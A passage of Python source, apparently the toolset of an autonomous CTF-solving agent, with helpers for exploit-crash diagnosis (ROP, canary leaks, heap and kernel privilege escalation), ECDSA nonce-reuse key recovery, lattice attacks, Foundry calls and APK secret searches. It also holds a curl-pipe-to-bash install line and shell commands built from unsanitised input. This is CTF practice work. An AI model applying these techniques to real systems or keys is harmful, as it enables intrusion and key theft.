            f"[validate_flag] MISMATCH — no {{...}} found in: {flag!r}\n"
            "CTF flags almost always have the format PREFIX{content}. "
            "You may have extracted a hex/decimal value, not the flag itself.\n"
            "Action: look for a string matching PREFIX{...} in the binary output."
        )

    # Try specific platform first
    platform = (platform or "auto").lower().strip()
    if platform != "auto":
        for name, pat in _FLAG_PATTERNS:
            if name.lower() == platform:
                if pat.match(flag):
                    return f"[validate_flag] OK — matches {name} format: {flag}"
                else:
                    return (
                        f"[validate_flag] MISMATCH — does not match {name} format.\n"
                        f"Flag: {flag!r}\n"
                        f"Expected pattern: {pat.pattern}\n"
                        "Action: double-check extraction — are there extra bytes, missing closing brace, or encoding issues?"
                    )

    # Auto-detect: try all patterns
    for name, pat in _FLAG_PATTERNS:
        if pat.match(flag):
            return f"[validate_flag] OK — matches {name} format: {flag}"

    # No match — give useful diagnostic
    prefix_match = re.match(r'^([A-Za-z0-9_]+)\{', flag)
    prefix = prefix_match.group(1) if prefix_match else "unknown"
    return (
        f"[validate_flag] MISMATCH — prefix '{prefix}' not in known platform list.\n"
        f"Flag: {flag!r}\n"
        "If this IS the correct flag for an unusual platform, call finish() anyway.\n"
        "Known prefixes: picoCTF, HTB, flag, CTF, ENSET, THM, ictf, or any CAPS{...}.\n"
        "If the flag looks wrong, keep extracting — check for encoding (hex/base64) or "
        "misalignment in the binary output."
    )


# ---------------------------------------------------------------------------
# _reset_environment — restore challenge files to t=0 snapshot
# ---------------------------------------------------------------------------

def _reset_environment(args: dict, session) -> str:
    """
    Restore all challenge files in the workdir to the snapshot made at agent startup.

    The snapshot is stored in session._workdir_snapshot (set by autonomous.py at startup).
    Only files that existed at startup are restored; new files created by the agent are
    left in place so logs and exploit scripts are preserved.
    """
    import shutil

    confirm = args.get("confirm", False)
    if not confirm:
        return (
            "[reset_environment] NOT EXECUTED — you must pass confirm=true.\n"
            "This will overwrite all modified challenge files with the t=0 snapshot."
        )

    if session is None:
        return "[reset_environment] No session available — cannot restore snapshot."

    snapshot_dir: Path | None = getattr(session, "_workdir_snapshot", None)
    workdir: Path | None = None

    # Try to determine workdir from working memory
    if session.working_memory.get("confirmed_workdir"):
        workdir = Path(session.working_memory["confirmed_workdir"])

    if snapshot_dir is None or not snapshot_dir.exists():
        # No snapshot taken yet — take one now so future resets work
        if workdir and workdir.exists():
            snap = session.dir / "_initial_snapshot"
            try:
                shutil.copytree(str(workdir), str(snap), dirs_exist_ok=True)
                session._workdir_snapshot = snap
                return (
                    "[reset_environment] Snapshot taken NOW (first call). "
                    "Future reset_environment calls will restore from this point.\n"
                    f"Snapshot saved to: {snap}"
                )
            except Exception as e:
                return f"[reset_environment] Failed to create snapshot: {e}"
        return (
            "[reset_environment] No snapshot available and workdir unknown.\n"
            "Tip: call update_memory('confirmed_workdir', '/abs/path/to/challenge') "
            "BEFORE the first exploit attempt so reset_environment can snapshot correctly."
        )

    if workdir is None or not workdir.exists():
        return (
            f"[reset_environment] Snapshot exists at {snapshot_dir} but workdir is unknown.\n"
            "Set confirmed_workdir in working memory and try again."
        )

    # Restore each file from the snapshot
    restored, skipped = 0, 0
    for src in snapshot_dir.rglob("*"):
        if not src.is_file():
            continue
        rel = src.relative_to(snapshot_dir)
        dst = workdir / rel
        try:
            dst.parent.mkdir(parents=True, exist_ok=True)
            shutil.copy2(str(src), str(dst))
            restored += 1
        except Exception:
            skipped += 1

    return (
        f"[reset_environment] ✓ Restored {restored} file(s) from snapshot.\n"
        f"(Skipped {skipped} due to permission errors.)\n"
        f"Your working memory and logs are unchanged. "
        f"You are back to the state at t=0 — try a different attack branch."
    )

def _exploit_crash_analyze(crash_output: str, binary: str = "", offset: int = 0) -> str:
    """
    Parse exploit crash output and return structured fix recommendations.
    Detects: MOVAPS alignment, cyclic-in-RIP, canary, double-free, EOF, seccomp,
    one_gadget constraint failure, KPTI kernel panic.
    """
    import re
    lo = crash_output.lower()
    findings: list[str] = []
    fixes: list[str] = []

    # ── Stack alignment (MOVAPS crash at system/execve) ──────────────────────
    if any(x in lo for x in ("movaps", "sigsegv", "segmentation fault", "illegal instruction")):
        if any(x in lo for x in ("system", "execve", "do_system", "movaps xmm")):
            findings.append("MOVAPS stack alignment crash — system() / execve() requires 16-byte aligned RSP")
            fixes.append(
                "Add a bare `ret` gadget BEFORE system() in your ROP chain:\n"
                "  ret_gadget = <addr from find_gadget(binary, 'ret$')>\n"
                "  rop.raw(ret_gadget)   # aligns RSP to 16 bytes\n"
                "  rop.raw(pop_rdi)\n"
                "  rop.raw(binsh)\n"
                "  rop.raw(system)"
            )

    # ── Cyclic pattern in RIP ─────────────────────────────────────────────────
    rip_match = re.search(r'(?:rip|eip|pc)[^0-9a-fx]*(?:0x)?([0-9a-f]{6,16})', lo)
    if rip_match:
        rip_hex = rip_match.group(1)
        # pwntools cyclic bytes start with 0x61616161 or 0x6161...
        if rip_hex.startswith("6161") or rip_hex.startswith("4141"):
            findings.append(f"Cyclic pattern 0x{rip_hex} found in RIP — good! Use this to find offset.")
            fixes.append(
                f"Run: cyclic_offset(binary='{binary or './binary'}') to get the exact offset.\n"
                "Or manually: python3 -c \"from pwn import *; print(cyclic_find(0x" + rip_hex[:8] + "))\""
            )
        elif any(x in lo for x in ("sigsegv", "segmentation")):
            findings.append(f"SIGSEGV at 0x{rip_hex} — wrong return address / bad ROP gadget")
            fixes.append(
                "Likely causes:\n"
                "1. Offset is wrong — re-run cyclic_offset to confirm exact RIP offset.\n"
                "2. Wrong gadget address — verify with find_gadget or ROPgadget output.\n"
                "3. PIE enabled — you need to leak .text base first before using hardcoded addresses.\n"
                f"   Run: gdb_analyze('{binary or './binary'}', 'A'*200)"
            )

    # ── Stack canary ──────────────────────────────────────────────────────────
    if any(x in lo for x in ("__stack_chk_fail", "stack smashing detected", "stack-smashing")):
        findings.append("Stack canary triggered — overflow overwrote the canary")
        fixes.append(
            "You must leak the canary before overflowing:\n"
            "Option A — Format string: send '%N$p' (increment N from 1..50) to dump stack;\n"
            "  the canary is an 8-byte value ending in \\x00 (null byte).\n"
            "Option B — Off-by-one null: if you can write exactly 1 byte past a buffer,\n"
            "  you can null out the canary LSB → use off-by-one.\n"
            "Option C — Brute (32-bit fork server only): try all 0x1000000 values for the 3\n"
            "  non-null bytes."
        )

    # ── Heap corruption / double-free ─────────────────────────────────────────
    if any(x in lo for x in ("double free", "malloc(): corrupted", "invalid next size",
                              "corrupted unsorted chunks", "free(): invalid pointer",
                              "heap-buffer-overflow", "abort()", "*** glibc detected ***")):
        findings.append("Heap integrity check failed — malloc/free assertion or double-free detected")
        ver_hint = _shell_exec("ldd --version 2>&1 | head -1", timeout=5)
        import re as _re
        vm = _re.search(r'(\d+\.\d+)', ver_hint)
        glibc_ver = vm.group(1) if vm else "unknown"
        fixes.append(
            f"Detected glibc {glibc_ver}. Choose the correct bypass:\n"
            "• glibc 2.27-2.28 (no tcache key): classic double-free works directly.\n"
            "• glibc 2.29-2.31 (tcache key present): use House of Botcake to bypass detection.\n"
            "  heap_exploit(binary, technique='botcake')\n"
            "• glibc 2.32+ (PROTECT_PTR safe-link): must XOR fd with (heap_base >> 12).\n"
            "  Leak heap base first via UAF read on first freed tcache chunk.\n"
            "• glibc 2.34+ (no hooks): use IO_FILE FSOP instead of __malloc_hook overwrite.\n"
            "  heap_exploit(binary, technique='io_file_fsop')"
        )

    # ── EOF / broken pipe / connection reset ──────────────────────────────────
    if any(x in lo for x in ("eof", "broken pipe", "connection reset", "connection refused",
                              "end of file", "recvfail")):
        findings.append("EOF / connection reset — payload size mismatch or I/O timing issue")
        fixes.append(
            "Checklist:\n"
            "1. Padding too long or too short: re-run cyclic_offset(binary, max_length=500).\n"
            "2. Architecture mismatch: 32-bit uses p32() (4 bytes), 64-bit uses p64() (8 bytes).\n"
            "   Check: file ./binary | grep 'ELF'\n"
            "3. Missing recv before send: use io.recvuntil(b'> ') before io.sendline(payload).\n"
            "4. Remote vs local: if local works but remote fails, check libc version mismatch.\n"
            "   web_search(query='puts=0x<last-3-bytes>', intent='libc')"
        )

    # ── Seccomp filter ────────────────────────────────────────────────────────
    if any(x in lo for x in ("seccomp", "bad syscall", "operation not permitted",
                              "syscall not permitted", "ptrace")):
        findings.append("Seccomp filter detected — execve('/bin/sh') is blocked")
        fixes.append(
            "Switch to an ORW (Open-Read-Write) chain:\n"
            "1. Check allowed syscalls: shell_exec('seccomp-tools dump " + (binary or "./binary") + "')\n"
            "2. Use rop_chain_synthesis(binary, goal='orw_flag', offset=N) for a ready script.\n"
            "3. ORW chain: open('/flag', O_RDONLY) → read(fd, buf, 0x50) → write(1, buf, 0x50)\n"
            "   Needed gadgets: pop rdi/rsi/rdx, open, read, write (via libc or PLT)."
        )

    # ── One-gadget constraints not met ───────────────────────────────────────
    if any(x in lo for x in ("one_gadget", "constraint")) or (
            "null" in lo and any(x in lo for x in ("r12", "rsp+0x30", "rdx"))):
        findings.append("One-gadget RCE constraint not satisfied — null register check failed")
        fixes.append(
            "Set up the required constraints before jumping to the gadget:\n"
            "  one_gadget /path/to/libc.so.6    ← see all gadgets + their constraints\n"
            "Common fixes:\n"
            "  [rsp+0x30] == NULL: add 'pop rax; ret; xor rax,rax; ...' before gadget,\n"
            "    or pick a gadget with a different constraint.\n"
            "  r12 == NULL: 'pop r12; ret; 0' before gadget.\n"
            "  rdx == NULL: 'pop rdx; ret; 0' or ret2csu to zero rdx."
        )

    # ── Kernel crash / panic ─────────────────────────────────────────────────
    if any(x in lo for x in ("kernel panic", "general protection fault", "kasan",
                              "page fault in interrupt", "bug: unable to handle",
                              "oops:", "brd: module loaded")):
        findings.append("Kernel crash — KPTI/SMEP/SMAP bypass error or bad ROP in ring-0")
        fixes.append(
            "Kernel ROP debugging checklist:\n"
            "1. KPTI: Use swapgs_restore_regs_and_return_to_usermode trampoline,\n"
            "   NOT bare swapgs + iretq.\n"
            "   Chain ending: [trampoline, 0, 0, user_rip, user_cs, user_rflags, user_rsp, user_ss]\n"
            "2. SMEP: Never put user-space code/data addresses in ring-0 ROP.\n"
            "3. Save user context in C BEFORE exploit:\n"
            "   asm('mov %cs, %[cs]' : [cs] '=r' (user_cs));\n"
            "4. commit_creds path: commit_creds(prepare_kernel_cred(0)) → uid=0.\n"
            "5. Check KASLR: cat /proc/kallsyms | grep 'startup_64'"
        )

    # ── Wrong libc offset / bad leak ──────────────────────────────────────────
    if any(x in lo for x in ("sigsegv", "segmentation")) and offset:
        if not findings:  # only if no other finding matched
            findings.append("SIGSEGV with known offset — likely wrong libc base or bad gadget address")
            fixes.append(
                "Libc base verification:\n"
                "1. Re-examine the leaked address: is it actually from puts/printf or a different symbol?\n"
                "2. web_search(query='puts=0x<last-12-bits-hex>', intent='libc') to identify libc version.\n"
                "3. Verify: leaked_puts = <value>; libc_base = leaked_puts - libc.sym['puts']\n"
                "   Then check: hex(libc_base)[-3:] == '000'  ← should end in three zeros.\n"
                "4. one_gadget(libc_path) — single-gadget avoids multi-offset error accumulation."
            )

    # ── Generic fallback ──────────────────────────────────────────────────────
    if not findings:
        findings.append("Crash type not definitively identified from output")
        fixes.append(
            "General diagnosis steps:\n"
            f"1. gdb_analyze('{binary or './binary'}', payload) — inspect crash RIP/RSP/registers.\n"
            "2. cyclic_offset(binary) — confirm exact RIP control offset.\n"
            "3. shell_exec('checksec --file=./binary') — re-verify protections.\n"
            "4. shell_exec('seccomp-tools dump ./binary 2>/dev/null') — check seccomp.\n"
            "5. Read the full traceback in crash_output carefully — line numbers matter."
        )

    out = ["## Exploit Crash Analysis\n"]
    for f in findings:
        out.append(f"**[DETECTED]** {f}\n")
    out.append("---")
    for i, fix in enumerate(fixes, 1):
        out.append(f"**Fix {i}:**\n```\n{fix}\n```\n")
    out.append("---")
    out.append("Apply the fix above, update your exploit script, and re-run. "
               "Do NOT call note_failure — this is a code fix, not an attack failure.")
    return "\n".join(out)


def _verify_crypto(
    mode: str,
    plaintext: str = "",
    ciphertext: str = "",
    key: str = "",
    params: dict = None,
) -> str:
    """
    Verify a crypto answer by re-encrypting / re-encoding and comparing to the
    challenge ciphertext. Returns PASS with details, or FAIL with the mismatch.
    Call this before reporting a flag for ANY crypto challenge.
    """
    params = params or {}
    out = [f"[verify_crypto] mode={mode}"]

    try:
        if mode == "xor_base64":
            # base64.b64decode(ciphertext) XOR key == plaintext bytes
            import base64 as _b64
            raw = _b64.b64decode(ciphertext)
            k = key.encode() if isinstance(key, str) else key
            decrypted = bytes(b ^ k[i % len(k)] for i, b in enumerate(raw))
            match = decrypted.decode(errors="replace") == plaintext
            out.append(f"  decoded: {decrypted!r}")
            out.append(f"  expected plaintext: {plaintext!r}")
            out.append(f"  RESULT: {'PASS ✓' if match else 'FAIL ✗ — wrong key or ciphertext'}")

        elif mode == "rsa_encrypt":
            n = int(params.get("n", 0))
            e = int(params.get("e", 0))
            c_expected = int(ciphertext) if ciphertext.isdigit() else int(ciphertext, 0)
            # plaintext may be int or bytes
            try:
                m = int(plaintext)
            except ValueError:
                m = int.from_bytes(plaintext.encode(), "big")
            c_computed = pow(m, e, n)
            match = c_computed == c_expected
            out.append(f"  pow({m}, {e}, {n}) = {c_computed}")
            out.append(f"  expected c: {c_expected}")
            out.append(f"  RESULT: {'PASS ✓' if match else 'FAIL ✗ — plaintext or params wrong'}")

        elif mode == "cube_encrypt":
            # c = m^e  (no modular reduction for small e)
            e = int(params.get("e", 3))
            try:
                m = int(plaintext)
            except ValueError:
                m = int.from_bytes(plaintext.encode(), "big")
            c_expected = int(ciphertext)
            c_computed = m ** e
            match = c_computed == c_expected
            out.append(f"  {m}^{e} = {c_computed}")
            out.append(f"  expected c: {c_expected}")
            out.append(f"  RESULT: {'PASS ✓' if match else 'FAIL ✗ — plaintext wrong'}")

        elif mode == "vigenere_encrypt":
            # Re-encrypt plaintext with key, compare to ciphertext
            pt = plaintext.upper()
            k = key.upper()
            if not k:
                out.append("  FAIL ✗ — no key provided")
                return "\n".join(out)
            ct_computed = "".join(
                chr((ord(p) - ord("A") + ord(k[i % len(k)]) - ord("A")) % 26 + ord("A"))
                for i, p in enumerate(pt) if p.isalpha()
            )
            ct_expected = ciphertext.upper()
            match = ct_computed == ct_expected
            out.append(f"  re-encrypted: {ct_computed}")
            out.append(f"  expected: {ct_expected}")
            out.append(f"  RESULT: {'PASS ✓' if match else 'FAIL ✗ — wrong key or plaintext'}")

        elif mode == "base64_chain":
            # Verify multi-layer encoding chain
            # params: {"chain": ["base64", "hex", "ascii"]}  (reverse of decode order)
            import base64 as _b64
            chain = params.get("chain", ["base64", "hex"])
            val = plaintext
            for step in reversed(chain):
                if step == "base64":
                    val = _b64.b64encode(val.encode() if isinstance(val, str) else val).decode()
                elif step == "hex":
                    val = val.encode().hex() if isinstance(val, str) else val.hex()
            match = val == ciphertext
            out.append(f"  re-encoded through {chain}: {val!r}")
            out.append(f"  expected: {ciphertext!r}")
            out.append(f"  RESULT: {'PASS ✓' if match else 'FAIL ✗ — encoding chain mismatch'}")

        elif mode == "morse_decode":
            # Decode Morse code (key) and compare to expected plaintext
            MORSE = {
                ".-": "A", "-...": "B", "-.-.": "C", "-..": "D", ".": "E",
                "..-.": "F", "--.": "G", "....": "H", "..": "I", ".---": "J",
                "-.-": "K", ".-..": "L", "--": "M", "-.": "N", "---": "O",
                ".--.": "P", "--.-": "Q", ".-.": "R", "...": "S", "-": "T",
                "..-": "U", "...-": "V", ".--": "W", "-..-": "X", "-.--": "Y",
                "--..": "Z", "-----": "0", ".----": "1", "..---": "2",
                "...--": "3", "....-": "4", ".....": "5", "-....": "6",
                "--...": "7", "---..": "8", "----.": "9",
            }
            morse_str = key or ciphertext
            words = morse_str.strip().split(" / ")
            decoded_words = []
            for word in words:
                chars = []
                for code in word.split():
                    chars.append(MORSE.get(code, f"?({code})"))
                decoded_words.append("".join(chars))
            decoded = " ".join(decoded_words).lower()
            expected = plaintext.lower().strip("ctf{}").replace("_", " ") if plaintext else ""
            match = decoded == expected or decoded.replace(" ", "_") == expected
            out.append(f"  morse decoded: {decoded!r}")
            out.append(f"  expected: {expected!r}")
            out.append(f"  RESULT: {'PASS ✓' if match else 'FAIL ✗ — Morse symbols may be wrong'}")
            if not match:
                out.append("  HINT: Check each symbol: .-=A -.-=K -..=D -.=N ..-=U .-.=R --=M")

        else:
            out.append(f"  ERROR: unknown mode '{mode}'")

    except Exception as exc:
        out.append(f"  ERROR: {exc}")
        out.append("  Check that params/ciphertext/plaintext are correct for this mode.")

    return "\n".join(out)


# ---------------------------------------------------------------------------
# ECDSA nonce reuse
# ---------------------------------------------------------------------------

def _ecdsa_nonce_reuse(r, s1, s2, h1, h2, curve_n=None, **_):
    """Recover ECDSA private key from two signatures sharing the same nonce."""
    _NAMED_CURVES = {
        "secp256k1": 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141,
        "secp256r1": 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551,
        "secp384r1": 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973,
        "nist256p":  0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551,
        "nist384p":  0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973,
        "secp521r1": 0x01FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFA51868783BF2F966B7FCC0148F709A5D03BB5C9B8899C47AEBB6FB71E91386409,
    }

    def _parse(v):
        v = str(v).strip()
        return int(v, 16) if v.startswith("0x") or v.startswith("0X") else int(v)

    try:
        r_  = _parse(r)
        s1_ = _parse(s1)
        s2_ = _parse(s2)
        h1_ = _parse(h1)
        h2_ = _parse(h2)
    except Exception as e:
        return f"[ecdsa_nonce_reuse] Parse error: {e}\nAll values must be decimal integers or 0x-hex strings."

    if curve_n is None:
        n = _NAMED_CURVES["secp256k1"]
        curve_note = "(defaulting to secp256k1 — pass curve_n to override)"
    elif str(curve_n) in _NAMED_CURVES:
        n = _NAMED_CURVES[str(curve_n)]
        curve_note = f"(curve: {curve_n})"
    else:
        try:
            n = _parse(str(curve_n))
            curve_note = "(custom n)"
        except Exception as e:
            return f"[ecdsa_nonce_reuse] Invalid curve_n: {e}"

    try:
        # k = (h1 - h2) * modinv(s1 - s2, n) mod n
        denom_k = (s1_ - s2_) % n
        if denom_k == 0:
            return "[ecdsa_nonce_reuse] s1 == s2 — signatures are identical or unrelated."
        k = ((h1_ - h2_) * pow(denom_k, -1, n)) % n

        # d = (s1 * k - h1) * modinv(r, n) mod n
        if r_ == 0:
            return "[ecdsa_nonce_reuse] r == 0 — invalid signature."
        d = ((s1_ * k - h1_) * pow(r_, -1, n)) % n

        lines = [
            f"[ECDSA Nonce Reuse Recovery] {curve_note}",
            f"  nonce k  = {hex(k)}",
            f"  priv key d = {hex(d)}",
        ]
        # Try to decode private key as text (sometimes it IS the flag)
        try:
            d_bytes = d.to_bytes((d.bit_length() + 7) // 8, "big")
            text = d_bytes.decode("utf-8", errors="replace")
            printable = sum(1 for c in text if c.isprintable())
            if printable > len(text) * 0.7:
                lines.append(f"  priv key as text: {repr(text)}")
        except Exception:
            pass
        lines.append(f"\n  Verification: s1*k-h1 should equal r*d (mod n)")
        lines.append(f"    lhs = {hex((s1_*k - h1_) % n)}")
        lines.append(f"    rhs = {hex((r_*d) % n)}")
        lines.append(f"    match = {((s1_*k - h1_) % n) == ((r_*d) % n)}")
        return "\n".join(lines)
    except Exception as e:
        return f"[ecdsa_nonce_reuse] Computation error: {e}"


# ---------------------------------------------------------------------------
# Lattice attack (Coppersmith / LLL / HNP)
# ---------------------------------------------------------------------------

def _lattice_attack(mode, polynomial=None, modulus=None, beta=0.5,
                    matrix_rows=None, hnp_signatures=None, curve_n=None, **_):
    """LLL-based attacks: Coppersmith small roots, raw LLL, HNP."""
    import subprocess, json, textwrap, tempfile, os

    out = [f"[lattice_attack] mode={mode}"]

    # ── Try SageMath first, fall back to fpylll ──────────────────────────────
    sage_bin = None
    for candidate in ("/usr/bin/sage", "/usr/local/bin/sage"):
        if os.path.exists(candidate):
            sage_bin = candidate
            break
    if sage_bin is None:
        # Try PATH
        import shutil
        sage_bin = shutil.which("sage")

    if mode == "coppersmith":
        if not polynomial or not modulus:
            return "[lattice_attack] coppersmith requires polynomial and modulus."
        if sage_bin:
            sage_code = textwrap.dedent(f"""
                N = {modulus}
                R.<x> = PolynomialRing(ZZ)
                f = {polynomial}
                roots = f.change_ring(Zmod(N)).monic().small_roots(beta={beta})
                print("roots:", roots)
                for r in roots:
                    print("root int:", int(r))
                    try:
                        b = int(r).to_bytes((int(r).bit_length()+7)//8,'big')
                        print("root bytes:", b)
                    except: pass
            """)
            with tempfile.NamedTemporaryFile("w", suffix=".sage", delete=False) as f:
                f.write(sage_code)
                sage_file = f.name
            try:
                res = subprocess.run([sage_bin, sage_file], capture_output=True, text=True, timeout=60)
                os.unlink(sage_file)
                out.append(res.stdout or "(no output)")
                if res.stderr.strip():
                    out.append(f"[stderr] {res.stderr[:400]}")
            except subprocess.TimeoutExpired:
                os.unlink(sage_file)
                out.append("[timeout] Sage took >60s — try increasing beta or simplifying polynomial.")
            except Exception as e:
                out.append(f"[sage error] {e}")
        else:
            out.append("[sage not found] Install SageMath for Coppersmith. Trying fpylll fallback...")
            try:
                from fpylll import IntegerMatrix, LLL
                out.append("[fpylll available] Build the lattice manually and use LLL reduction.")
            except ImportError:
                out.append("[fpylll not found] Install: pip install fpylll  OR  apt install sagemath")

    elif mode == "lll_matrix":
        if not matrix_rows:
            return "[lattice_attack] lll_matrix requires matrix_rows."
        if sage_bin:
            rows_str = str(matrix_rows)
            sage_code = textwrap.dedent(f"""
                M = matrix(ZZ, {rows_str})
                L = M.LLL()
                print("LLL-reduced basis:")
                print(L)
                print("Shortest vector:", L[0])
            """)
            with tempfile.NamedTemporaryFile("w", suffix=".sage", delete=False) as f:
                f.write(sage_code)
                sage_file = f.name
            try:
                res = subprocess.run([sage_bin, sage_file], capture_output=True, text=True, timeout=60)
                os.unlink(sage_file)
                out.append(res.stdout or "(no output)")
                if res.stderr.strip():
                    out.append(f"[stderr] {res.stderr[:300]}")
            except Exception as e:
                out.append(f"[sage error] {e}")
        else:
            try:
                from fpylll import IntegerMatrix, LLL
                m = IntegerMatrix.from_matrix(matrix_rows)
                LLL.reduction(m)
                out.append(f"LLL-reduced (fpylll):\n{m}")
            except ImportError:
                out.append("[no lattice backend] Install sagemath or fpylll.")

    elif mode == "hnp":
        if not hnp_signatures or not curve_n:
            return "[lattice_attack] hnp requires hnp_signatures and curve_n."
        n = int(curve_n, 0) if str(curve_n).startswith("0x") else int(curve_n)
        if sage_bin:
            sigs_str = json.dumps(hnp_signatures)
            sage_code = textwrap.dedent(f"""
                import json
                n = {n}
                sigs = json.loads('{sigs_str}')
                # Build HNP lattice: given MSB leaks of k recover private key d
                # Each sig: r, s, h, msb_leak (top bits of k), leak_bits
                m = len(sigs)
                L_dim = m + 2
                L = matrix(ZZ, L_dim, L_dim)
                for i, sig in enumerate(sigs):
                    r = int(sig['r']); s = int(sig['s']); h = int(sig['h'])
                    leak = int(sig.get('msb_leak',0)); lb = int(sig.get('leak_bits',0))
                    t_i = r * pow(s, -1, n) % n
                    u_i = (-h * pow(s, -1, n) - leak * pow(2, n.bit_length()-lb, 1)) % n
                    L[i, i] = n
                    L[m, i] = t_i
                    L[m+1, i] = u_i
                L[m, m] = 1
                L[m+1, m+1] = n
                B = L.LLL()
                # The private key is likely in the last few rows
                for row in B:
                    candidate = int(row[-2]) % n
                    if 0 < candidate < n:
                        print(f"Candidate private key: {{hex(candidate)}}")
            """)
            with tempfile.NamedTemporaryFile("w", suffix=".sage", delete=False) as f:
                f.write(sage_code)
                sage_file = f.name
            try:
                res = subprocess.run([sage_bin, sage_file], capture_output=True, text=True, timeout=90)
                os.unlink(sage_file)
                out.append(res.stdout or "(no output)")
                if res.stderr.strip():
                    out.append(f"[stderr] {res.stderr[:300]}")
            except Exception as e:
                out.append(f"[sage error] {e}")
        else:
            out.append("[sage not found] HNP via SageMath is recommended. Install sagemath.")

    return "\n".join(out)


# ---------------------------------------------------------------------------
# Foundry / Blockchain tool
# ---------------------------------------------------------------------------

def _foundry_run(action, command="", rpc_url="http://127.0.0.1:8545",
                 contract_address="", value="0", session=None, **_):
    """
    Run foundry tools (cast / forge / anvil) for blockchain/EVM CTF challenges.
    action: 'cast' | 'forge' | 'anvil_start' | 'anvil_stop' | 'deploy' | 'call'
    """
    import subprocess, shutil, os

    out = [f"[foundry_run] action={action}"]

    # Check foundry is installed
    if not shutil.which("cast") and not shutil.which("forge"):
        out.append("[foundry not installed] Install with: curl -L https://foundry.paradigm.xyz | bash && foundryup")
        out.append("Fallback: try web3.py via shell_exec for basic interactions.")
        return "\n".join(out)

    if action == "cast":
        # Direct cast command
        full_cmd = f"cast {command}"
        if rpc_url and "--rpc-url" not in command:
            full_cmd += f" --rpc-url {rpc_url}"
        try:
            res = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=30)
            out.append(res.stdout or "(no output)")
            if res.stderr.strip():
                out.append(f"[stderr] {res.stderr[:400]}")
        except subprocess.TimeoutExpired:
            out.append("[timeout] cast took >30s")
        except Exception as e:
            out.append(f"[error] {e}")

    elif action == "forge":
        full_cmd = f"forge {command}"
        try:
            res = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=120,
                                 cwd="/tmp/ctf_forge" if os.path.isdir("/tmp/ctf_forge") else None)
            out.append(res.stdout or "(no output)")
            if res.stderr.strip():
                out.append(f"[stderr] {res.stderr[:600]}")
        except subprocess.TimeoutExpired:
            out.append("[timeout] forge took >120s")
        except Exception as e:
            out.append(f"[error] {e}")

    elif action == "anvil_start":
        # Start a local EVM node in the background
        if session:
            from ctf_rag.tools import _bg_shell
            result = _bg_shell(action="start", shell_id="anvil",
                               command=f"anvil --port 8545 --chain-id 1337 {command}")
            out.append(result)
        else:
            out.append("Start anvil manually: anvil --port 8545 --chain-id 1337")

    elif action == "anvil_stop":
        if session:
            from ctf_rag.tools import _bg_shell
            result = _bg_shell(action="kill", shell_id="anvil")
            out.append(result)

    elif action == "call":
        # High-level contract call helper
        if not contract_address:
            return "[foundry_run] call requires contract_address."
        sig = command  # e.g. "solve()" or "balanceOf(address)(uint256)"
        full_cmd = f"cast call {contract_address} '{sig}' --rpc-url {rpc_url}"
        try:
            res = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=30)
            out.append(res.stdout or "(no output)")
            if res.stderr.strip():
                out.append(f"[stderr] {res.stderr[:300]}")
        except Exception as e:
            out.append(f"[error] {e}")

    elif action == "send":
        # Send a transaction
        sig = command
        full_cmd = (f"cast send {contract_address} '{sig}' "
                    f"--value {value} --rpc-url {rpc_url} "
                    f"--private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80")
        try:
            res = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=30)
            out.append(res.stdout or "(no output)")
            if res.stderr.strip():
                out.append(f"[stderr] {res.stderr[:300]}")
        except Exception as e:
            out.append(f"[error] {e}")

    else:
        out.append(f"[unknown action] Use: cast, forge, anvil_start, anvil_stop, call, send")

    return "\n".join(out)


# ---------------------------------------------------------------------------
# Android APK analysis
# ---------------------------------------------------------------------------

def _android_analyze(apk_path, action="decompile", output_dir=None, query="", session=None, **_):
    """
    Analyse an Android APK using jadx and aapt.
    action: 'decompile' | 'manifest' | 'permissions' | 'strings' | 'search'
    """
    import subprocess, shutil, os, tempfile

    out = [f"[android_analyze] action={action}  apk={apk_path}"]

    if not os.path.exists(apk_path):
        return f"[android_analyze] APK not found: {apk_path}"

    if action == "manifest":
        # Extract AndroidManifest.xml
        if shutil.which("aapt"):
            res = subprocess.run(["aapt", "dump", "xmltree", apk_path, "AndroidManifest.xml"],
                                 capture_output=True, text=True, timeout=30)
            out.append(res.stdout[:3000] or "(no output)")
        elif shutil.which("apktool"):
            tmpdir = tempfile.mkdtemp(prefix="apk_")
            subprocess.run(["apktool", "d", "-f", "-o", tmpdir, apk_path],
                           capture_output=True, timeout=60)
            manifest = os.path.join(tmpdir, "AndroidManifest.xml")
            if os.path.exists(manifest):
                with open(manifest) as f:
                    out.append(f.read()[:3000])
            else:
                out.append("[manifest not found after apktool decode]")
        else:
            # Fallback: unzip and read raw
            res = subprocess.run(f"unzip -p {apk_path!r} AndroidManifest.xml | strings",
                                 shell=True, capture_output=True, text=True, timeout=15)
            out.append(res.stdout[:2000] or "(binary manifest — install aapt or apktool for readable output)")

    elif action == "permissions":
        if shutil.which("aapt"):
            res = subprocess.run(["aapt", "dump", "permissions", apk_path],
                                 capture_output=True, text=True, timeout=20)
            out.append(res.stdout or "(no permissions found)")
        else:
            out.append("[aapt not installed] Install: apt install aapt")

    elif action == "strings":
        # Strings search across all DEX files in the APK
        res = subprocess.run(
            f"unzip -p {apk_path!r} '*.dex' | strings | grep -iE 'flag|ctf|secret|password|key|token' | head -100",
            shell=True, capture_output=True, text=True, timeout=30,
        )
        out.append(res.stdout or "(no interesting strings found)")
        # Also check assets and res
        res2 = subprocess.run(
            f"unzip -l {apk_path!r} | grep -iE 'asset|res/' | head -30",
            shell=True, capture_output=True, text=True, timeout=10,
        )
        if res2.stdout.strip():
            out.append("\n[Assets/Resources]")
            out.append(res2.stdout)

    elif action == "decompile":
        if not shutil.which("jadx"):
